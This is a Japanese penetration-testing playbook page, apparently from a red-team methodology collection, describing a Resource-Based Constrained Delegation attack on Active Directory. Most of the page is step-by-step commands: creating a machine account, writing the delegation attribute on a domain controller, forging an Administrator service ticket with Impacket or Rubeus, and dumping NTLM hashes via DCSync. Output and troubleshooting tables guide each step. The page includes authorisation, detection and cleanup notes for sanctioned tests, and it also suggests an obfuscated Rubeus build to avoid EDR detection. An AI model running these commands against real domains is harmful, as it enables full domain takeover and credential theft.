# RBCD（Resource-Based Constrained Delegation）攻撃

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [ ] 業務停止リスク（サービス・認証）
> - [ ] 持続化に該当
> - [x] 不可逆な設定変更を含む（マシンアカウント作成・msDS-AllowedToActOnBehalfOfOtherIdentity 属性の変更）
> - [x] SIEM/EDR で確実に検知される（Event ID 4741 マシンアカウント作成 / 4769 Kerberos S4U）
>
> 実施可否は事前合意で明示確認すること。作成したマシンアカウントの削除、RBCD 属性のクリーンアップが必須。演習環境（HTB / OSCP 等）では制約なし。

> **スコープ**: GenericAll/GenericWrite + SeMachineAccountPrivilege がある前提での RBCD 攻撃 → DCSync 実行まで。DCSync の手順は `../Credential_Dumping.md` を参照。

## 着火条件

以下の**両方**が満たされている場合：

1. 現在のユーザーが **対象コンピューター（通常はDC）に GenericAll または GenericWrite** を持つ（BloodHound で確認）
2. 現在のユーザーが **`SeMachineAccountPrivilege`** を持つ（`whoami /all` で確認）

## 環境前提

- 実行環境: テスター端末（Linux）から、またはターゲット上の Windows シェルから
- 必要なツール（Linux ルート）: `impacket-addcomputer`・`impacket-rbcd`・`impacket-getST`・`impacket-secretsdump`（すべてペネトレ用 Linux ディストリ標準搭載）
- 必要なツール（Windows ルート）: `PowerMad`（GitHub 要）・`Rubeus`（GitHub 要、別途転送）
- オフライン代替: Linux ルートは DC への LDAP/Kerberos アクセスさえあればネットワーク内完結

## 先に確認すること

- `ms-DS-MachineAccountQuota` の確認（デフォルト 10。0 になっている場合はマシンアカウント作成不可）:
  ```bash
  # [Attacker]
  netexec ldap [DC_IP] -u '[USER]' -p '[PASSWORD]' -M maq
  ```
- `/etc/hosts` に DC の FQDN が登録されているか確認（Kerberos は IP ではなく FQDN が必要）

**攻撃者の思考トレース**: `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性に自分が制御するマシンアカウントの SID を書くと、そのアカウントが対象ホストへの S4U 委任を使えるようになる。自分で作ったマシンアカウントを使って DC のサービスチケットを取得 → DCSync が基本フロー。

---

## 1. ルートA: Impacket ベース（Linux 側から完結・推奨）

**コマンド:**

```bash
# [Attacker] Step 1: 攻撃用マシンアカウントを作成
impacket-addcomputer \
  -computer-name '[CASE_ID]_TEST$' \
  -computer-pass '[ATTACKER_CHOSEN_PASSWORD]' \
  -dc-ip [DC_IP] \
  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]'
```

```bash
# [Attacker] Step 2: DC の RBCD 属性を設定
impacket-rbcd \
  -delegate-to '[DC_HOSTNAME]$' \
  -delegate-from '[CASE_ID]_TEST$' \
  -action write \
  -dc-ip [DC_IP] \
  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]'
```

```bash
# [Attacker] Step 3: Administrator のサービスチケットを取得
impacket-getST \
  -spn 'cifs/[DC_FQDN]' \
  -impersonate administrator \
  -dc-ip [DC_IP] \
  '[DOMAIN]/[CASE_ID]_TEST$:[ATTACKER_CHOSEN_PASSWORD]'
```

**事前準備（必須）:** チケット取得後に環境変数を設定してから DCSync を実行する。

```bash
# [Attacker] Step 4: チケットを使って DCSync
export KRB5CCNAME=./administrator@cifs_[DC_FQDN]@[DOMAIN].ccache
impacket-secretsdump \
  -k -no-pass \
  -just-dc-ntlm \
  -target-ip [DC_IP] \
  administrator@[DC_FQDN]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `Successfully added machine account [CASE_ID]_TEST$` | Step 1 成功 | Step 2 に進む |
| `Delegation rights modified successfully!` | Step 2 成功 | Step 3 に進む |
| `[*] Saved TGS...` / `administrator@cifs_[DC_FQDN]@...ccache` 生成 | Step 3 成功 | KRB5CCNAME を export して Step 4 に進む |
| `Administrator:500:...[NTLM_HASH]:::` | DCSync 成功 | `../Credential_Dumping.md` §2 Pass-The-Hash でアクセスを確立 |

**注意:** `-spn 'cifs/[DC_FQDN]'` の FQDN は IP ではなく `[DC_HOSTNAME].[DOMAIN_FQDN]` の完全修飾名にする（Kerberos は IP では通らない）。

---

## 2. ルートB: PowerMad + Rubeus（Windows シェル内から完結）

Windows シェル取得済み、かつ Impacket が使えない場合（ファイアウォール・Kerberos 設定の問題等）に選ぶ。

**事前準備（必須）:** テスター端末で `Powermad.ps1` と `Rubeus.exe` を用意し、evil-winrm でアップロードする。

```bash
# [Attacker] evil-winrm セッションからアップロード
upload Powermad.ps1
upload Rubeus.exe
```

**コマンド:**

```powershell
# [Target] Step 1: PowerMad でマシンアカウントを作成
. ./Powermad.ps1
New-MachineAccount -MachineAccount '[CASE_ID]-COMP$' `
  -Password $(ConvertTo-SecureString '[ATTACKER_CHOSEN_PASSWORD]' -AsPlainText -Force)

# SID を確認（次のステップで必要）
Get-ADComputer -Identity '[CASE_ID]-COMP$' | Select-Object Name, SID
```

```powershell
# [Target] Step 2: DC の RBCD 属性を設定
Set-ADComputer -Identity [DC_HOSTNAME] `
  -PrincipalsAllowedToDelegateToAccount '[CASE_ID]-COMP$'

# 設定確認
Get-ADComputer -Identity [DC_HOSTNAME] -Properties PrincipalsAllowedToDelegateToAccount |
  Select-Object Name, PrincipalsAllowedToDelegateToAccount
```

```powershell
# [Target] Step 3: Rubeus でパスワードハッシュを計算（S4U に rc4_hmac が必要）
.\Rubeus.exe hash /password:[ATTACKER_CHOSEN_PASSWORD] /user:'[CASE_ID]-COMP$' /domain:[DOMAIN]
# 出力の rc4_hmac 値を控える → [RC4_HASH]
```

```powershell
# [Target] Step 4: S4U 攻撃でサービスチケットを取得
.\Rubeus.exe s4u `
  /user:'[CASE_ID]-COMP$' `
  /rc4:[RC4_HASH] `
  /impersonateuser:Administrator `
  /msdsspn:'cifs/[DC_FQDN]' `
  /domain:[DOMAIN] `
  /ptt
# /ptt でチケットが Windows セッションに直接注入される

# 確認
klist
dir \\[DC_FQDN]\C$
```

**Linux 側へ持ち出す場合:**

```bash
# [Attacker] Rubeus の Base64 出力をデコードして ccache に変換
base64 -d ticket.kirbi.b64 > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=./ticket.ccache
impacket-psexec [DOMAIN]/administrator@[DC_FQDN] -k -no-pass
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `[+] Machine account [CASE_ID]-COMP$ added` | Step 1 成功 | Step 2 に進む |
| `CN=[CASE_ID]-COMP$,...` が表示される | Step 2 成功（属性確認） | Step 3 に進む |
| `[+] Ticket successfully imported!` | Step 4 成功（チケット注入） | `klist` で確認 → `dir \\[DC_FQDN]\C$` でアクセス確立 |

**注意:** Rubeus.exe は多くの AV/EDR でシグネチャ検知される。本番では事前合意の上、難読化ビルドまたは代替手法を検討する。

---

## 刺さらなかったとき

| 現象 | ルート | 原因・対処 |
|------|--------|-----------|
| `KRB_AP_ERR_SKEW` | A/B | 時刻のずれ。`sudo ntpdate [DC_IP]`（Linux）または `w32tm /resync`（Windows）で同期 |
| チケット取得に失敗 | A | FQDN を使っているか確認。`/etc/hosts` への DC の FQDN 登録を確認 |
| `New-MachineAccount` が失敗 | B | `ms-DS-MachineAccountQuota` が 0。`Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota` で確認 |
| `Set-ADComputer` が Access Denied | B | 対象コンピューターへの GenericAll/GenericWrite を再確認。グループ経由の権限の場合ログオフ→再ログインが必要なことがある |
| Rubeus s4u が `KRB5KDC_ERR_BADOPTION` | B | RBCD 属性設定後 1〜2 分待ってから再試行する |
| Base64 チケット変換後に psexec がエラー | B→A | チケットに空白・改行が混入。`cat ticket.kirbi.b64 \| tr -d ' \n' > ticket_clean.b64` で整形してから再変換 |
| `SeMachineAccountPrivilege` がない | A/B | 前提条件不成立。代わりに既存の制御できるマシンアカウントを探す（BloodHound で「WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity」を探す）|

---

## 注意点・落とし穴

- `KRB5CCNAME` 環境変数は `export` でセッションに設定する（sudo で実行する場合は `-E` オプション）
- マシンアカウントの作成上限（デフォルト10台）に達している場合は、既存マシンアカウントへの書き込み権限があればそれを利用する

---

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。マシンアカウント作成と DC への RBCD 属性書き込みを伴うため、ドメイン全体への影響と監査ログ痕跡が残る
- **想定されるSIEM/EDR検知**:
  - Event ID 4741（コンピューターアカウント作成）
  - Event ID 4742（コンピューターアカウントの属性変更：msDS-AllowedToActOnBehalfOfOtherIdentity）
  - Event ID 4769（Kerberos サービスチケット要求：S4U2Self / S4U2Proxy が短時間に発生）
  - Defender for Identity の RBCD アラート
- **業務影響リスク**: なし（読み取り操作の組み合わせだが、属性変更による設定汚染が残る）
- **原状回復必須項目**:
  - ✅ 作成したマシンアカウント（`[CASE_ID]_TEST$` / `[CASE_ID]-COMP$`）の削除
  - ✅ 対象コンピューターの `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性のクリア（`impacket-rbcd -action remove` または属性を null に戻す）
  - ✅ 取得した `.ccache` チケットファイルの破棄
  - ✅ DCSync で取得した NTLM ハッシュは `../Credential_Dumping.md` の原状回復項目に従う
- **取得情報の取扱**: 取得したチケット・NTLM ハッシュは暗号化保管、テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：GenericAll の確認 → `../ACE_Abuse/GenericAll.md`
- 前：BloodHound でパスを発見 → `../../05_Tools_Reference/BloodHound.md`
- 後：DCSync 実行後 → `../Credential_Dumping.md`
- 関連：Unconstrained Delegation との比較 → `./Unconstrained.md`
